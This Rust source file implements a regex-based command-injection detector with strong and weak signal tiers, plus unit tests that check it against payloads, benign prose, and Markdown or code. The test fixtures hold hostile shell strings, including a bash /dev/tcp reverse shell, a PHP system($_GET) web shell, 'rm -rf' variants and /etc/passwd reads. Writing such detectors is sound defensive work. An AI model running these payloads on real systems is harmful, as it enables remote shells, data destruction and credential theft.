// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

use crate::{AttackCategory, DetectionResult, Detector, Severity, regex_detect};
use regex::Regex;
use std::sync::LazyLock;

/// 强信号：命令执行 / 危险函数的**可执行**形态，出现即是 Critical。
/// 每条都带内容约束 —— 只认函数名出现的「裸词」形态会把英语散文和技术文档判成攻击
/// （`system (`、`PowerShell 7`、`cmd.exe scripts`、`pattern.exec(`）。
/// 8 条分支合并成 1 条 alternation —— `regex_detect` 对列表里每条 `Regex` 各跑一次
/// `find`，干净输入下 8 次全文扫描变 1 次。分支顺序 = 原 vec 顺序（同一位置上取最左
/// 分支；与「按列表顺序取第一条命中的模式」相比偏移量可能不同，档位不变）。
/// 内联 flag 一律裹进 `(?i:…)` —— 裸 `(?i)` 的作用域会蔓延到它后面拼进来的分支。
static STRONG_PATTERNS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        // bash 专属伪设备，正常内容里不存在
        r"/dev/tcp[/\w]*",
        // 以下六个函数名只在「紧跟实参」时才判：散文里的函数名之后没有 `(`/引号/`$`
        r"|(?i:passthru\s*\()",
        r"|(?i:shell_exec\s*\()",
        // 要求实参以引号或 `$` 开头：`system($_GET['cmd'])`、`system("id")` 命中，
        // `Our system (v2) is faster.` / `The system (as opposed to the client)` 不命中。
        r#"|(?i:system\s*\(\s*["'$])"#,
        r"|(?i:popen\s*\()",
        r"|(?i:pcntl_exec\s*\()",
        // 只认调用形态（`-Command` / `-EncodedCommand`），安装说明里的词出现不算
        r"|(?i:powershell(?:\.exe)?\s+-\w)",
        // 只认带 `/c` `/k` 开关的调用形态，`Legacy deployments used cmd.exe scripts` 不算
        r"|(?i:cmd\.exe\s+/[ck]\b)",
        // 敏感路径**不设强信号**：`cat /etc/passwd` 在载荷里和在教程/文档的
        // 代码块里逐字节同形（examples: "Run `cat /etc/passwd` to list accounts"、
        // 缩进代码块 `cat /etc/passwd | grep -i admin`），给 reader+路径开 Critical
        // 会把讲解这类命令的文档一并拒掉。路径形态留在弱档（见 WEAK_PATTERNS 的
        // reader 动词条与反引号条）。
    ))
    .unwrap()
});

/// 弱信号：形态上与正常内容逐字节同形的那些 —— 运算符、反引号 code span、
/// JS 的 `exec(`、重定向。正则无法把它们和 Markdown 表格、文档里的行内代码、
/// `pattern.exec(str)` 分开，所以报 Low 不报 Critical：仍然命中（不静默漏报），
/// 但单条 5 分不触发拒绝，是否升级交给调用方按聚合分决定。
/// 10 条分支合并成 1 条 alternation —— `regex_detect` 对列表里每条 `Regex` 各跑一次
/// `find`，干净输入下 10 次全文扫描变 1 次。分支顺序 = 原 vec 顺序（同一位置上取最左
/// 分支；与「按列表顺序取第一条命中的模式」相比偏移量可能不同，档位不变）。
/// 内联 flag 一律裹进 `(?i:…)` —— 裸 `(?i)` 的作用域会蔓延到它后面拼进来的分支。
static WEAK_PATTERNS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r"\$\([^)]+\)",
        r"|\|[\s]*\w+",
        r"|\|\|[\s]*\w+",
        r"|&&\s*\w+",
        // 反引号 span：与 Markdown 行内代码（`` `npm install` ``）同形。
        // 敏感路径也在这一档 —— `` `cat /etc/passwd` `` 与教程里的行内代码同形。
        r"|`[^`]+`",
        // `exec(`：`exec\s*\(\s*["'$]` 能分开 `re.exec(str)` 和 `exec("id")`，
        // 但 JS 里 `re.exec("literal")` 是常规写法，加了约束照样误判 —— 整条降档。
        r"|(?i:exec\s*\()",
        // 重定向符：部署文档 / code span 里同样写着 `deploy.sh >/dev/null`
        r"|>/dev/null",
        // reader 动词 + 敏感路径：裸形态（`cat /etc/passwd`）没有定界符，与
        // 教程代码块里的同一行逐字节同形 —— 检出但只报 Low。
        r"|(?i:\b(?:cat|type|more|less|head|tail|strings|xxd|od)\s+/etc/(?:passwd|shadow)\b)",
        // 工具名裸词：强档只认调用形态（`cmd.exe /c`、`powershell -Command`），
        // 裸词放这里只为不静默漏报 —— 安装说明命中也不过 5 分，不触发拒绝。
        r"|(?i:cmd\.exe)",
        r"|(?i:powershell)",
    ))
    .unwrap()
});

pub struct CommandInjectionDetector;

impl Detector for CommandInjectionDetector {
    fn name(&self) -> &'static str {
        "command_injection"
    }

    fn detect(&self, input: &str) -> Option<DetectionResult> {
        regex_detect(
            std::slice::from_ref(&*STRONG_PATTERNS),
            self.name(),
            AttackCategory::Injection,
            Severity::Critical,
            "Command injection detected",
            input,
        )
        .or_else(|| {
            regex_detect(
                std::slice::from_ref(&*WEAK_PATTERNS),
                self.name(),
                AttackCategory::Injection,
                Severity::Low,
                "Shell operator present (weak signal)",
                input,
            )
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn det() -> CommandInjectionDetector {
        CommandInjectionDetector
    }

    fn assert_hit(input: &str) {
        assert_hit_at(input, Severity::Critical);
    }

    fn assert_hit_at(input: &str, severity: Severity) {
        crate::test_helpers::assert_detected(&det(), input, AttackCategory::Injection, severity);
    }

    #[test]
    fn name_is_command_injection() {
        assert_eq!(det().name(), "command_injection");
    }

    #[test]
    fn detects_common_payloads() {
        for (input, severity) in [
            // 强信号：可执行形态，Critical
            ("bash -i >& /dev/tcp/10.0.0.1/4444", Severity::Critical),
            ("php -r 'system($_GET[\"cmd\"]);'", Severity::Critical),
            ("cmd.exe /c dir", Severity::Critical),
            ("powershell -Command Get-Process", Severity::Critical),
            ("powershell.exe -EncodedCommand SQBuAHYAbwBrAGUAKAAp", Severity::Critical),
            ("system(\"id\")", Severity::Critical),
            // 弱信号：运算符形态恢复检测，但降为 Low（不再单独触发拒绝）
            ("$(rm -rf /)", Severity::Low),
            ("ls | grep passwd", Severity::Low),
            ("cd /tmp && rm -rf *", Severity::Low),
            // 反引号 span 与 Markdown 行内代码同形，降为 Low：
            // `` `cat /etc/passwd` `` 在载荷里和在「Run `cat /etc/passwd` to list
            // accounts」这种教程行里逐字节同形，只有调用方知道它提交的是哪个。
            ("`cat /etc/passwd`", Severity::Low),
            ("`systemctl restart app`", Severity::Low),
            ("exec(\"id\")", Severity::Low),
            ("deploy.sh >/dev/null", Severity::Low),
            // 敏感路径与工具名：强档只认调用形态，裸形态在弱档 —— 不静默漏报，
            // 也不把讲解这些命令的文档判成攻击
            ("cat /etc/passwd", Severity::Low),
            ("type /etc/shadow", Severity::Low),
            ("cmd.exe", Severity::Low),
            ("powershell", Severity::Low),
        ] {
            assert_hit_at(input, severity);
        }
    }

    /// 与上面同型的正常文本：同样命中（不再漏报），但只报 Low，
    /// 由调用方按聚合分决定是否拒绝 —— 单条不至于把 Markdown 表格判成攻击。
    #[test]
    fn shell_shaped_text_is_low_not_critical() {
        for input in [
            "| Name | Age | City |\n|------|-----|------|\n| Ada | 36 | London |",
            "if (a && b) { return c; }",
            "$(document).ready(function() { init(); });",
            "https://shop.example/search?a=1&&b=2",
            r#"const total = price * qty && discount > 0;"#,
        ] {
            assert_hit_at(input, Severity::Low);
        }
    }

    /// 收紧后必须完全干净的「词出现但无调用形态」：散文里的 `system (`、
    /// 散文里的 `/dev/null`、没有 reader 动词的敏感路径**引用**。
    #[test]
    fn tool_names_and_parens_in_prose_are_clean() {
        for input in [
            "The system (as opposed to the client) handles authentication.",
            "Our system (v2) is faster than the previous release.",
            "See the runbook (internal) for the rollback procedure.",
            "Log output can be discarded by redirecting to /dev/null.",
            "The /etc/passwd file holds user account records.",
            "On Linux, /etc/shadow stores password hashes.",
            "Never commit /etc/passwd to your repository.",
        ] {
            crate::test_helpers::assert_clean(&det(), input);
        }
    }

    /// 工具名裸词是弱信号：安装说明命中，但只有 5 分，不触发拒绝。
    #[test]
    fn docs_mentioning_tool_names_are_low_not_critical() {
        for input in [
            "Install PowerShell 7 from the Microsoft Store, then run the installer.",
            "Legacy deployments used cmd.exe scripts; those are deprecated.",
        ] {
            assert_hit_at(input, Severity::Low);
        }
    }

    #[test]
    fn benign_inputs_not_detected() {
        for input in [
            "Hello, this is a normal text input. Nothing suspicious here.",
            "The system is running normally",
            "I executed the plan successfully",
            "Pipes are used to join commands in unix",
            "Please run the update script",
        ] {
            assert!(det().detect(input).is_none(), "false positive: {input}");
        }
    }

    /// 真实语料中与运算符形态无关的部分：仍然完全干净。
    /// （含 `|` / `&&` / `$(` 的那几条不在这里 —— 它们现在是 Low 命中，
    /// 见 `shell_shaped_text_is_low_not_critical`。）
    #[test]
    fn real_world_inputs_not_detected() {
        for input in [
            // 普通 HTML 页面片段
            r#"<!DOCTYPE html>
<html lang="en"><head><title>Docs</title></head>
<body><h1>Welcome</h1><p>Read the <a href="/about">about page</a>.</p>
<img src="/logo.png" alt="logo" width="120">
</body></html>"#,
            // 普通 SVG 文件
            r##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
  <path d="M12 2 2 22h20z" fill="none" stroke="#333" stroke-width="2"/>
  <circle cx="12" cy="12" r="4" fill="#09f"/>
</svg>"##,
            // 普通 CSS 块
            "body { margin: 0; font-family: system-ui, sans-serif; }\n.card { display: flex; gap: 8px; color: #334155; }",
            // 单个 `&` 的查询串（`&&` 才是弱信号形态）
            "https://shop.example/search?q=shoes&size=42",
        ] {
            crate::test_helpers::assert_clean(&det(), input);
        }
    }

    #[test]
    fn edge_cases() {
        assert!(det().detect("").is_none());
        assert!(det().detect(" \t\n ").is_none());
        assert!(det().detect("你好世界 こんにちは").is_none());
        // near misses: keyword present but not the payload form
        assert!(det().detect("system id").is_none());
        assert!(det().detect("rm -rf /").is_none());
        assert!(det().detect("cmd /c dir").is_none());
        assert!(det().detect("shell_exec without parens").is_none());
        // `cmd.exe` / `powershell` 裸词不是干净输入 —— 它们在弱档命中（Low），
        // 见 `detects_common_payloads`；这里只钉「没有强档调用形态」。
    }

    #[test]
    fn obfuscated_variants_detected() {
        for input in [
            "SYSTEM('id')",
            "Shell_Exec('id')",
            "PowerShell -Command Get-Process",
            "PASSTHRU('id')",
        ] {
            assert_hit(input);
        }
    }
}
